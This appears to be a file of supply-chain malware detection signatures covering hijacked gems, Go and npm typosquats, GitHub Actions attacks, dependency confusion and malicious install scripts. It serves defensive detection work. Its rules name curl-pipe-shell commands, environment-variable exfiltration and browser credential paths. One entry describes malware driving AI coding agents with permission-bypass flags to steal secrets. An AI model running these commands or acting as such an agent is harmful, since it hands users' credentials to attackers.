In April 2019, the bootstrap-sass RubyGem was hijacked when an attacker gained
access to the maintainer's RubyGems.org account. The malicious version 3.2.0.3
was published containing a backdoor that allowed remote code execution via a
specially crafted cookie. The backdoor was hidden in a modified _precompile.rb
file and used Base64 encoding to obfuscate the payload. The legitimate
bootstrap-sass gem had millions of downloads and was used in many Rails
applications. The attack was discovered when the suspicious version appeared
in dependency resolution.

signatures.title: git_credential_manager gem hijacked via dormant account
signatures.description:
The git_credential_manager gem was hijacked through a dormant RubyGems maintainer account
in the SleeperGem campaign. Versions 2.8.0-2.8.3 download binaries from git.disroot.org
with SSL verification disabled, then execute via PowerShell (Windows) or /bin/sh (Unix).
The malware specifically avoids CI environments by checking ~30 CI-related env variables.

signatures.title: rest-client gem hijacked — credential stealer
signatures.description:
In August 2019, the rest-client RubyGem was hijacked through a compromised
maintainer account. The malicious version 1.6.13 contained code that collected
system information and credentials, sending them to a remote Pastebin-like
service. The backdoor also gave the attacker the ability to remotely execute
arbitrary code on infected systems. The rest-client gem had over 100 million
total downloads and was one of the most popular HTTP client libraries for Ruby.
Multiple other gems from the same maintainer were also compromised.

signatures.title: strong_password gem hijacked — remote code execution backdoor
signatures.description:
In July 2019, the strong_password RubyGem was hijacked after the original
maintainer's RubyGems.org account was compromised. The malicious version 0.0.7
contained a backdoor that fetched and executed arbitrary Ruby code from a remote
Pastebin URL on every application boot. The fetched payload would evaluate
dynamically, giving the attacker persistent remote code execution on any system
running the compromised gem. This was part of a wave of RubyGems account
compromises in mid-2019 that included rest-client.

signatures.title: Go shopspring/decimal typosquat (shopsprint)
signatures.description:
Malicious Go module discovered in 2025 that impersonates the widely used
github.com/shopspring/decimal library (arbitrary-precision decimal math).
The typosquat uses a single-character substitution (shopsprint vs shopspring)
to trick developers. The module contains hidden malicious functionality
designed to compromise developer systems. The Go Module Mirror's caching
mechanism enabled persistence even after GitHub removal.

signatures.title: Typosquatting target — github.com/gin-gonic/gin
signatures.description:
Gin is the most popular HTTP web framework for Go with over 80,000 GitHub stars. Go modules
use full repository paths as import identifiers, so typosquatting attacks target both the
organization name (gin-gonic) and the module name. Attackers can create lookalike GitHub
repositories or use alternative hosting platforms (gitlab.com, gitea) to intercept developers
who mistype the import path in their go.mod files.

signatures.title: Go hypert typosquat (belatedplanet)
signatures.description:
One of four malicious Go modules discovered February 2025, impersonating
the legitimate github.com/areknoster/hypert HTTP API testing library.
Contains concealed functions enabling remote code execution via loader
malware that contacts attacker C2 infrastructure. Part of a seven-package
Go typosquatting campaign that also targeted the layout library.

signatures.title: Go hypert typosquat (shadowybulk)
signatures.description:
One of four malicious Go modules discovered February 2025, impersonating
the legitimate github.com/areknoster/hypert HTTP API testing library.
Contains hidden RCE functions that download and execute malicious payloads
from attacker infrastructure. Part of a broader campaign that also included
typosquats of the github.com/loov/layout library. Targets Linux and macOS.

signatures.title: Go hypert typosquat (shallowmulti)
signatures.description:
Discovered February 2025, one of four malicious Go modules impersonating
the legitimate github.com/areknoster/hypert library (HTTP API client testing
tool). The package embedded concealed functions enabling remote code execution
by downloading and executing a malicious script from the C2 domain
alturastreet.icu (typosquatted banking domain). Specifically targeted
developers in the financial sector. Deployed loader malware targeting
Linux and macOS systems.

signatures.title: Go layout typosquat (vainreboot)
signatures.description:
Discovered February 2025, one of three malicious Go modules impersonating
the legitimate github.com/loov/layout library. Part of a broader seven-package
Go typosquatting campaign that also targeted the hypert library. All fraudulent
versions follow the same obfuscation techniques and deploy identical loader
payloads targeting Linux and macOS systems for remote code execution.

signatures.title: Typosquatting target — org.apache.commons:commons-lang3
signatures.description:
Apache Commons Lang is one of the most depended-upon Java libraries, providing utility
methods for core Java classes including string manipulation, number handling, and reflection.
The long Maven coordinate with multiple repeated words (commons:commons) makes it highly
susceptible to typos. Confusion between commons-lang (v2) and commons-lang3 (v3) is a
known issue that attackers can exploit by registering intermediate variants.

signatures.title: Typosquatting target — com.google.guava:guava
signatures.description:
Google Guava is one of the most widely used Java utility libraries, providing collections,
caching, concurrency utilities, and common annotations. It is a core dependency in a vast
number of enterprise Java applications. Maven coordinate typosquatting targets both the
groupId and artifactId components, and attackers may register similar groupIds to intercept
developers who mistype the dependency declaration in pom.xml or build.gradle.

signatures.title: Typosquatting target — com.fasterxml.jackson.core:jackson-databind
signatures.description:
Jackson Databind is the most widely used JSON serialization library in the Java ecosystem,
present in virtually every Spring Boot application and enterprise Java service. Its complex
Maven coordinate with multiple segments (fasterxml.jackson.core:jackson-databind) creates
numerous typosquatting opportunities across both groupId and artifactId. Jackson has been
the subject of many deserialization CVEs, making developers accustomed to updating it
frequently, which increases the risk of installing a typosquatted variant during upgrades.

signatures.title: Typosquatting target — @angular/core (3M+ weekly downloads)
signatures.description:
@angular/core is the runtime foundation of the Angular framework with over 3 million weekly
npm downloads. Typosquatting attacks commonly target the unscoped name "angular" or hyphenated
variants like "angular-core" since developers may forget the @angular/ scope prefix. An
attacker publishing an unscoped package with a similar name can intercept installations from
developers unfamiliar with npm scoped packages.

signatures.title: Typosquatting target — axios (45M+ weekly downloads)
signatures.description:
axios is one of the most popular HTTP client libraries on npm with over 45 million weekly
downloads. It is used extensively in both browser and Node.js environments for API
communication. Its short name and common transposition patterns (axois, axiso) make it a
frequent typosquatting target, with several malicious variants historically detected on npm.

signatures.title: Typosquatting target — chalk (100M+ weekly downloads)
signatures.description:
chalk is a terminal string styling library with over 100 million weekly npm downloads,
making it one of the most depended-upon packages in the Node.js ecosystem. Its short,
easy-to-mistype name creates numerous typosquatting opportunities through character
transposition and adjacent-key errors on standard keyboard layouts.

signatures.title: Typosquatting target — commander (90M+ weekly downloads)
signatures.description:
commander is the leading CLI argument parser for Node.js with over 90 million weekly
downloads. It is a transitive dependency in thousands of npm packages. The double-m and
multiple vowels in the name make it prone to typos, and its widespread use in CLI tooling
means a malicious typosquat could execute code during development or CI builds.

signatures.title: Typosquatting target — lodash (50M+ weekly downloads)
signatures.description:
lodash has over 50 million weekly npm downloads and is one of the most depended-upon
packages in the entire JavaScript ecosystem. Its extreme popularity makes it a prime
target for typosquatting attacks. Any package published under these variant names should
be treated as a potential typosquatting attempt and flagged for manual review before use.

signatures.title: Typosquatting target — moment (15M+ weekly downloads)
signatures.description:
moment is a widely used date manipulation library with over 15 million weekly npm downloads.
Despite being in maintenance mode, it remains deeply embedded in enterprise codebases and
legacy projects. Adjacent-key typos like momnet and missing-character variants like momet
are realistic attack vectors given the package's continued high install volume.

signatures.title: Typosquatting target — next (5M+ weekly downloads)
signatures.description:
next (Next.js) is a leading React framework with over 5 million weekly npm downloads,
widely used for server-side rendered applications. Its extremely short name makes collision
and typosquatting trivial. A compromised variant could inject malicious server-side code
that runs on every request, making it a high-value target for supply chain attackers.

signatures.title: Typosquatting target — react (20M+ weekly downloads)
signatures.description:
react has over 20 million weekly downloads and is the foundation of a large fraction of
modern web applications. Typosquatting react can deliver malicious UI code to any
downstream application. Variant names using l→1 substitutions, doubled letters, or
transposed characters are commonly registered by attackers targeting JavaScript developers.

signatures.title: Typosquatting target — typescript (45M+ weekly downloads)
signatures.description:
typescript has over 45 million weekly npm downloads and is a critical build-time dependency
for a large portion of the JavaScript ecosystem. Because it runs as a compiler during builds
with full system access, a typosquatted variant could execute arbitrary code in CI/CD
pipelines. The long name with multiple syllables creates many plausible typo variants.

signatures.title: Typosquatting target — vue (5M+ weekly downloads)
signatures.description:
vue (Vue.js) is one of the three major frontend JavaScript frameworks with over 5 million
weekly npm downloads. Its extremely short three-letter name means even a single character
transposition or substitution creates a plausible typosquat. Attackers have previously
targeted short framework names to deliver credential-stealing malware to frontend developers.

signatures.title: Typosquatting target — webpack (25M+ weekly downloads)
signatures.description:
webpack is the dominant JavaScript module bundler with over 25 million weekly npm downloads.
It runs during build processes where it has full filesystem and network access, making a
malicious typosquat particularly dangerous. Attackers targeting webpack can execute arbitrary
code during CI/CD builds, exfiltrate environment variables, or inject backdoors into bundled
application code.

signatures.title: Typosquatting target — boto3 (200M+ monthly downloads)
signatures.description:
boto3 is the official AWS SDK for Python with over 200 million monthly PyPI downloads,
making it one of the most installed packages in the entire PyPI ecosystem. It is present
in virtually every Python application that interacts with AWS services. Typosquatting boto3
is an extremely high-value attack because the package inherently operates with AWS
credentials, and a malicious variant could directly exfiltrate IAM keys, session tokens,
and access to cloud infrastructure.

signatures.title: Typosquatting target — django (8M+ monthly downloads)
signatures.description:
django is a major Python web framework with over 8 million monthly PyPI downloads, used
extensively in enterprise and government web applications. The unusual consonant cluster
"dj" at the start makes it particularly prone to transposition typos. Attackers have
previously registered django typosquats to target developers deploying production web
applications that handle authentication and database operations.

signatures.title: Typosquatting target — flask (10M+ monthly downloads)
signatures.description:
flask is one of the most popular Python web frameworks with over 10 million monthly PyPI
downloads. It powers a large number of production APIs and microservices. A typosquatted
flask variant could inject backdoors into web applications, intercept HTTP requests, or
establish reverse shells on servers running Flask-based APIs.

signatures.title: Typosquatting target — numpy (50M+ monthly downloads)
signatures.description:
numpy is the foundational numerical computing library in Python with over 50 million monthly
PyPI downloads. It is a dependency of virtually every data science and machine learning
project. Attackers have repeatedly targeted numpy with typosquatting variants, as a
compromised installation grants access to scientific computing environments that often
contain sensitive research data and cloud credentials.

signatures.title: Typosquatting target — pandas (40M+ monthly downloads)
signatures.description:
pandas is the dominant data analysis library in Python with over 40 million monthly PyPI
downloads. It is ubiquitous in data engineering pipelines, Jupyter notebooks, and ETL
workflows. Typosquatting pandas is particularly dangerous because data science environments
frequently handle database credentials, API keys, and sensitive datasets that a malicious
package could exfiltrate.

signatures.title: Typosquatting target — pillow (50M+ monthly downloads)
signatures.description:
pillow (PIL fork) is the standard Python imaging library with over 50 million monthly
PyPI downloads. It is a dependency of web frameworks, data science tools, and image
processing pipelines. The double-l in the name commonly leads to typos with single or
triple l variants. A malicious typosquat could exploit image processing contexts to
achieve code execution through crafted payloads.

signatures.title: Typosquatting target — requests (300M+ monthly downloads)
signatures.description:
requests is the most downloaded Python package on PyPI with over 300 million monthly
downloads. It is a universal dependency across data science, DevOps, and web development
toolchains. Attackers frequently register single-character variants or common prefix/suffix
patterns to intercept developers who mistype the package name in requirements.txt or
pyproject.toml. Previously confirmed malicious typosquats include `request` and `requets`.

signatures.title: Typosquatting target — scrapy (3M+ monthly downloads)
signatures.description:
scrapy is the leading Python web scraping framework with over 3 million monthly PyPI
downloads. It is commonly confused with scapy (the packet manipulation library), creating
a natural typosquatting vector. Scrapy environments typically run automated crawlers with
network access, making a malicious variant dangerous for data exfiltration or as a pivot
point into internal networks.

signatures.title: Typosquatting target — tensorflow (10M+ monthly downloads)
signatures.description:
tensorflow is Google's machine learning framework with over 10 million monthly PyPI
downloads. It is the foundation of production ML systems across industries. Its long
compound name (tensor + flow) creates many plausible typo variants. A malicious
typosquat could compromise ML training pipelines, steal model weights, or exfiltrate
training data containing sensitive information.

signatures.title: Typosquatting target — devise (100M+ total downloads)
signatures.description:
devise is the standard authentication solution for Ruby on Rails with over 100 million
total downloads. It handles user registration, login, password reset, and session
management. A typosquatted devise gem is extremely dangerous because it would directly
control authentication flows, enabling credential theft, session hijacking, or backdoor
account creation in Rails applications.

signatures.title: Typosquatting target — nokogiri (300M+ total downloads)
signatures.description:
nokogiri is the most popular XML/HTML parsing library in Ruby with over 300 million total
downloads. Its Japanese name (meaning "saw") is frequently misspelled by English-speaking
developers. The unusual spelling creates many natural typosquatting opportunities through
vowel transposition and missing characters. Nokogiri processes untrusted HTML/XML input,
making a malicious variant especially dangerous.

signatures.title: Typosquatting target — rails (300M+ total downloads)
signatures.description:
rails (Ruby on Rails) is the most popular Ruby web framework with over 300 million total
downloads on RubyGems. It powers a massive number of production web applications including
GitHub, Shopify, and Basecamp. Its short, common-word name makes it susceptible to
typosquatting through simple transpositions and adjacent-key errors that could inject
malicious code into Rails application servers.

signatures.title: GitHub Actions runner memory scraping
signatures.description:
The Trivy GitHub Actions compromise (March 2026) by TeamPCP used a
three-stage payload that included memory scraping from Runner.Worker
processes to extract secrets that are not exposed via standard GitHub
Actions secret mechanisms. This technique can recover secrets from
other steps in the same job, OIDC tokens, and other sensitive data
held in runner process memory.
signatures.rule:
Detect GitHub Actions workflows or steps that attempt to read memory
from Runner.Worker processes or other runner infrastructure processes.
Look for: /proc/*/mem access patterns, process memory dump tools
(gcore, procdump), Runner.Worker process targeting, or patterns that
extract environment variables and secrets from runner process memory
rather than from the standard $GITHUB_ENV or secrets context.

signatures.title: GitHub Actions version tag force-push detection
signatures.description:
The March 2026 TeamPCP campaign systematically force-pushed malicious
commits to version tags across multiple GitHub Actions (Trivy, KICS,
AST). This technique is particularly dangerous because many workflows
pin to version tags (e.g., @v1) rather than commit SHAs. A force-push
to a tag silently redirects all pinned workflows to malicious code.
The only defense is pinning to full commit SHAs and monitoring tag
integrity via Sigstore/SLSA attestations.
signatures.rule:
Detect when multiple GitHub Actions version tags are force-pushed in
rapid succession. The TeamPCP attacks on trivy-action (75/76 tags),
kics-github-action (all release tags), and setup-trivy (7 tags) all
used force-pushes to redirect existing pinned references to malicious
commits. Monitor for: bulk tag updates within short time windows,
tag updates that change the commit hash without a corresponding
release, and tags pointing to commits not in the main branch history.

signatures.title: Package published with identical name to known internal/private package
signatures.description:
Dependency confusion attacks exploit the resolution order of package managers that
check public registries before (or alongside) private registries. An attacker publishes
a public package with the same name as a company's private package, often at a much
higher version number. Build systems then pull the malicious public version instead
of the intended private one. Alex Birsan demonstrated this against 35+ major tech
companies in 2021. This rule generalizes across all ecosystems — npm, PyPI, RubyGems,
Maven, Go, and Cargo all have variants of this vulnerability depending on their
registry resolution behavior.
signatures.rule:
Package name matches patterns commonly used for internal/private packages:
  - Contains organizational identifiers: -internal, -private, -corp, -enterprise,
    -staging, -dev, -infra, -platform, -core-lib, -service, -microservice
  - OR matches known internal naming conventions:
    <company>-<service>, <company>_<utility>, <org>.<project>.<module>
  - OR is an unscoped version of a known scoped package (@org/pkg published as org-pkg)
AND the package exhibits dependency confusion indicators:
  - Version number is artificially high (>= 99.0.0 or >= 9999.0.0)
  - OR first published version is >= 1.0.0 with no prior versions
  - OR published within 24 hours of a reference appearing in a public leak
    (package-lock.json, requirements.txt, go.sum in public repos)
AND the package has zero or near-zero legitimate downloads
AND the package contains install-time scripts or init-time code execution

signatures.title: Package with zero or minimal functional code but complex install scripts
signatures.description:
Legitimate packages exist to provide reusable functionality — their main code should
be substantial relative to their install scripts. A package with no meaningful library
code but complex install-time behavior is a strong indicator of a malicious payload
carrier. The package's sole purpose is to execute the install script; the published
module is just a delivery mechanism. This heuristic catches a wide class of supply
chain attacks across all ecosystems, including dependency confusion probes, credential
harvesters, and dropper packages. The pattern is ecosystem-agnostic and applies to
npm, PyPI, RubyGems, Go modules, Maven, and Cargo crates alike.
signatures.rule:
Package exhibits a disproportion between functional code and install-time behavior:
  - Main module / library code is empty, contains only pass/noop, or < 10 lines
  - AND install scripts (postinstall, setup.py, extconf.rb, build plugin) contain
    > 50 lines of code or invoke external processes
OR package has:
  - No exports, no public API, no documented functionality
  - AND a complex lifecycle script with network access, file system operations,
    or subprocess execution
OR package README/description is minimal or auto-generated
  - AND package has install scripts that perform significant operations
AND the package was published recently (< 90 days) with no prior version history

signatures.title: GitHub Actions script injection via untrusted context interpolation
signatures.description:
GitHub Actions script injection occurs when untrusted event data is interpolated directly
into run: blocks via ${{ }} expressions. Discovered by Wiz Red Agent in Snowflake's
snowflake-connector-net repository (2026), where a workflow interpolated issue titles
into a shell command, allowing unauthenticated RCE that exfiltrated Jira API credentials.
GitHub Advanced Security failed to flag the pattern. This class of vulnerability affects
any public repository with workflows triggered by issues_opened, pull_request_target,
or issue_comment events that use direct context interpolation.
signatures.rule:
Detect GitHub Actions workflow files that directly interpolate untrusted event context
(github.event.issue.title, github.event.pull_request.title, github.event.comment.body,
github.event.discussion.title, github.event.pages.*.page_name, github.event.head_commit.message)
into run: shell commands using the ${{ }} expression syntax. This allows unauthenticated
attackers to inject arbitrary shell commands by crafting malicious issue titles, PR titles,
or comment bodies. Safe alternatives: pass the value through an environment variable
(env: TITLE: ${{ github.event.issue.title }}) and reference it as $TITLE in the run block,
or use jq with --arg for JSON-safe handling.

signatures.title: GitHub Actions pull_request_target workflow exploitation
signatures.description:
The AsyncAPI npm backdoor exploited a pull_request_target workflow vulnerability to steal npm
publish tokens. pull_request_target runs in the context of the base branch with access to
secrets, but can be tricked into executing attacker-controlled code from a PR. This pattern
has been used in multiple real-world supply chain attacks to compromise CI/CD pipelines.
signatures.rule:
Flag GitHub Actions workflows using pull_request_target trigger that checkout PR head code
and run it with access to repository secrets. Check for workflows combining
pull_request_target trigger with actions/checkout using ref: github.event.pull_request.head.sha
or ref: github.event.pull_request.head.ref, especially when followed by steps that access
secrets or publish to package registries.

signatures.title: Module with go:generate directive that runs arbitrary commands
signatures.description:
The //go:generate directive tells `go generate` to run arbitrary shell commands. While
go generate is not automatically invoked by go build or go install, developers and CI
pipelines frequently run it as part of their build process. A malicious go:generate
directive in a dependency can execute arbitrary commands when a developer runs
`go generate ./...` in a project that imports the compromised module. Unlike init()
attacks, this requires an explicit go generate invocation, but many build scripts and
Makefiles include this step. The directive is also easily overlooked in code review
because it appears as a comment.
signatures.rule:
Go source files contain //go:generate directives that execute suspicious commands:
  - //go:generate curl <URL> | sh
  - //go:generate wget <URL> -O- | bash
  - //go:generate sh -c "<complex command>"
  - //go:generate powershell -Command "<command>"
  - //go:generate cmd /c "<command>"
OR //go:generate directives that invoke tools not in the standard Go toolchain:
  - Tools that download from external URLs
  - Tools that modify files outside the module directory
  - Tools that exfiltrate environment variables or system information
AND the directive is present in source files included in the module distribution
(not just in internal development tooling)

signatures.title: Module downloads and executes external binary in init() function
signatures.description:
Downloading and executing an external binary in init() combines two dangerous
behaviors: automatic execution without user action and running arbitrary unaudited
machine code. Because Go modules are fetched and cached by the go toolchain, a
compromised module version can persist in the module cache and execute its payload
every time any binary importing it is built or run. The downloaded binary runs with
the same privileges as the Go process, potentially as root in CI/CD environments.
This pattern bypasses Go's source-level analysis tools since the malicious behavior
is in the downloaded binary, not the Go source.
signatures.rule:
Go module source contains an init() function that:
  - Downloads a file from an external URL:
    net/http.Get(), net/http.DefaultClient.Do(), or equivalent HTTP client calls
  - AND writes the downloaded content to disk:
    os.Create(), os.WriteFile(), io.Copy() to a file
  - AND executes the downloaded file:
    os/exec.Command(), syscall.Exec(), os.StartProcess()
  - OR uses os.Chmod() to set executable permissions before execution
OR init() decodes an embedded binary (base64, hex) and executes it
AND the binary is not a well-known tool distributed via Go (e.g. protoc, buf)

signatures.title: Module with init() function that exfiltrates environment variables
signatures.description:
Go's init() functions execute automatically when a package is imported, before main()
runs, making them ideal for supply chain attacks. Because Go statically links all
dependencies, init() functions from every transitively imported package execute in
the final binary. Environment variables in Go applications frequently contain database
connection strings, API keys, cloud credentials, and service tokens. Exfiltrating
these via init() is silent, requires no explicit function call, and executes even in
test binaries. This technique has been observed in typosquatted Go modules targeting
popular packages.
signatures.rule:
Go module source contains an init() function that:
  - Reads environment variables via os.Getenv(), os.Environ(), or os.LookupEnv()
  - AND makes outbound network requests via:
    net/http.Get(), net/http.Post(), net/http.NewRequest(),
    net.Dial(), net.DialTimeout(), or DNS resolution with net.LookupHost()
  - AND the environment data is included in the request body, URL parameters,
    HTTP headers, or encoded in DNS query subdomains
OR init() spawns a goroutine that performs the above operations asynchronously
AND the module is not a well-known configuration/environment library (e.g. viper, envconfig)

signatures.title: POM with build plugin that executes arbitrary commands during build
signatures.description:
Maven build plugins execute during the build lifecycle with the full privileges of the
build process. The exec-maven-plugin and maven-antrun-plugin can run arbitrary system
commands. When a malicious dependency's POM injects a build plugin bound to an early
lifecycle phase, it executes before any application code is compiled. This is the Java
ecosystem's equivalent of npm's postinstall attack vector. Maven Central has seen
dependency confusion attacks where malicious POMs inject exec-maven-plugin configurations
to exfiltrate CI secrets or download backdoors during builds.
signatures.rule:
POM.xml or build.gradle contains a build plugin configuration that executes commands:
  - maven-antrun-plugin with <exec> tasks running shell commands
  - exec-maven-plugin (org.codehaus.mojo:exec-maven-plugin) with arbitrary commands
  - groovy-maven-plugin with inline Groovy scripts that invoke Runtime.exec()
  - maven-enforcer-plugin custom rules that execute system commands
  - OR custom plugin with <configuration> containing shell commands, curl/wget invocations
AND the commands include any of:
  - Downloads from external URLs (curl, wget, PowerShell Invoke-WebRequest)
  - Execution of downloaded files (sh, bash, cmd, powershell)
  - Network exfiltration (curl POST with system data, DNS lookups)
  - Access to credentials (~/.m2/settings.xml, environment variables)
AND the plugin execution is bound to early lifecycle phases (validate, initialize,
generate-sources, process-sources, compile)

signatures.title: JAR with manifest Class-Path pointing to remote URL for remote class loading
signatures.description:
A JAR manifest with a Class-Path pointing to a remote URL or code using URLClassLoader
with external URLs enables remote class loading, allowing an attacker to serve arbitrary
Java bytecode at runtime. The attacker controls the remote server and can change the
served classes at any time, serve different payloads to different targets, or activate
a dormant backdoor on command. This technique bypasses signature verification on the
original JAR since the malicious code is loaded separately. Remote class loading was
a key vector in historical Java security exploits and remains relevant in supply chain
attacks against the Maven ecosystem.
signatures.rule:
JAR file manifest (META-INF/MANIFEST.MF) contains:
  - Class-Path entry with HTTP/HTTPS URLs instead of local paths
  - OR Main-Class pointing to a class that loads remote classes via URLClassLoader
OR JAR source code contains:
  - URLClassLoader with external URL arguments (new URLClassLoader(new URL[]{"http://..."}))
  - Class.forName() with classes loaded from remote sources
  - Reflection-based loading of classes downloaded at runtime
  - javax.script.ScriptEngine evaluating remotely-fetched code
AND the remote URL is not a well-known Maven repository or CDN
AND the loaded classes are executed (instantiated, method invoked, or cast to a known interface)

signatures.title: AI coding agent weaponization via postinstall
signatures.description:
First observed in the August 2025 Nx supply chain compromise, this
technique weaponizes locally installed AI coding agents by invoking
them with dangerous permission-bypass flags. The malware prompts
the AI to inventory sensitive files (SSH keys, .env, cloud creds)
and write results to /tmp/inventory.txt, then reads and exfiltrates
them. This represents a novel attack vector where AI tools become
unwitting accomplices in credential theft.
signatures.rule:
Detect npm packages whose install scripts invoke AI coding agents
(claude, gemini, amazon-q, cursor, copilot, aider, cody) with
permission-bypass flags such as --dangerously-skip-permissions,
--yolo, --trust-all-tools, or --no-confirm. The Nx attack (Aug 2025)
demonstrated that malware can leverage these agents to perform
filesystem reconnaissance and credential exfiltration on behalf
of the attacker, bypassing traditional detection.

signatures.title: Package accesses browser credential stores (Chrome Login Data, Firefox logins.json)
signatures.description:
Accessing browser credential stores is a hallmark of infostealer malware. Chrome's
Login Data is an SQLite database containing saved passwords (encrypted with DPAPI on
Windows or Keychain on macOS). Firefox's logins.json contains encrypted credentials.
This pattern was observed in the npm packages ultra-type, iconserver, and numerous
Discord token stealers. No legitimate npm package has any reason to access browser
password databases or cookie stores.
signatures.rule:
Package source contains file path references to any browser credential store:
  - Chrome: "Login Data", "Cookies", "Web Data", "Local State"
    Paths: ~/Library/Application Support/Google/Chrome/,
           ~/.config/google-chrome/, %LOCALAPPDATA%\Google\Chrome\User Data\
  - Firefox: "logins.json", "key4.db", "cookies.sqlite", "cert9.db"
    Paths: ~/Library/Application Support/Firefox/Profiles/,
           ~/.mozilla/firefox/, %APPDATA%\Mozilla\Firefox\Profiles\
  - Edge: "Login Data", "Cookies" under Edge paths
  - Brave: "Login Data" under Brave paths
AND contains file read operations (fs.readFile, fs.readFileSync, fs.copyFile)
AND contains network exfiltration (http, https, fetch, dns, net.Socket)

signatures.title: Bun runtime bootstrap in npm preinstall hook
signatures.description:
The Mini Shai-Hulud campaign and its derivatives use Bun as a bootstrapper across dozens of
compromised npm packages (keyv, flat-cache, SAP CAP.js, Bitwarden CLI, TanStack, @antv).
Legitimate npm packages almost never download and execute the Bun runtime at install time.
This behavioral pattern has been the most reliable indicator across the entire campaign family.
signatures.rule:
Flag npm packages where the preinstall or postinstall script downloads and executes the Bun
JavaScript runtime. Check for: "bun run" in lifecycle scripts, references to oven-sh/setup-bun,
setup.mjs files that download binaries from github.com/oven-sh/bun, or preinstall scripts
that spawn detached background processes with stdio:ignore and windowsHide:true options.

signatures.title: preinstall script detects CI environment and behaves differently
signatures.description:
Malicious packages that detect CI environments can target the most valuable execution
context — build pipelines that hold deployment credentials, signing keys, cloud IAM
tokens, and NPM_TOKEN values. By only activating in CI, the malware avoids triggering
alerts on developer machines where security tools are more likely to be running. The
Codecov bash uploader compromise (2021) demonstrated this technique at scale, extracting
CI secrets from thousands of repositories. CI-aware conditional execution in a library
package is almost never legitimate.
signatures.rule:
Package lifecycle script or main module checks for CI environment variables:
  - CI, CONTINUOUS_INTEGRATION, BUILD_NUMBER, JENKINS_URL, TRAVIS,
    GITHUB_ACTIONS, GITLAB_CI, CIRCLECI, CODEBUILD_BUILD_ID, TF_BUILD,
    BITBUCKET_PIPELINE, DRONE, BUILDKITE, TEAMCITY_VERSION
AND executes different code paths based on CI detection:
  - if (process.env.CI) { <payload> }
  - OR if (process.env.GITHUB_ACTIONS) { <exfiltration> }
  - OR conditional network requests only when CI vars are present
AND the CI-specific code path contains suspicious behavior:
  - Network exfiltration, file reads of secrets, environment dumping
  - OR the CI-specific path is more complex than the non-CI path

signatures.title: Install script executes curl|sh or wget|bash remote code execution pattern
signatures.description:
The curl-pipe-shell pattern downloads and immediately executes arbitrary remote code
without any integrity verification, signature checking, or content inspection. This
is extremely dangerous in a package install context because the remote server controls
what code runs, can serve different payloads based on request headers (targeting CI
environments), and leaves no auditable artifact. Multiple npm malware families use
this pattern to download second-stage payloads. No legitimate npm library package
should use this pattern during installation.
signatures.rule:
Package has any lifecycle script (preinstall, install, postinstall) in package.json
AND the script or referenced file contains a pipe-to-shell pattern:
  - curl <URL> | sh, curl <URL> | bash, curl -s <URL> | sh
  - wget <URL> -O- | sh, wget -q <URL> | bash
  - OR equivalent constructed via child_process.exec() with string concatenation
AND the URL is not a well-known legitimate installer (e.g. rustup.rs, nvm-sh, brew)
OR the script uses child_process to invoke:
  - /bin/sh -c "$(curl ...)" or /bin/bash -c "$(wget ...)"

signatures.title: Dependency confusion attack — internal package name published to public registry
signatures.description:
Dependency confusion (namespace confusion) attacks exploit package manager resolution
order. When an attacker publishes a public package with the same name as a company's
private internal package — often at a higher version number — build systems may resolve
to the malicious public version. Alex Birsan's 2021 research demonstrated this against
Apple, Microsoft, Tesla, and 30+ other companies. The attack requires no code injection
into the target's repo — only the ability to publish a package with the right name.
Packages matching internal naming patterns with no public history should be audited.
signatures.rule:
Package name matches known internal naming conventions:
  - Starts with @<company>/ scoped name AND no legitimate public presence exists
  - OR contains common internal suffixes: -internal, -private, -corp, -enterprise
AND package was recently published (< 30 days old)
AND package has zero prior download history
AND package version is unusually high (>= 1.0.0 on first publish)

signatures.title: Package reads and exfiltrates .git/config or .gitconfig for repo/credential theft
signatures.description:
Git configuration files contain sensitive information including repository URLs (which
reveal internal infrastructure), user identity, and potentially plaintext credentials
stored via git-credential-store. The .git/config file in particular can contain HTTPS
URLs with embedded tokens (https://token@github.com/org/repo). Exfiltrating this data
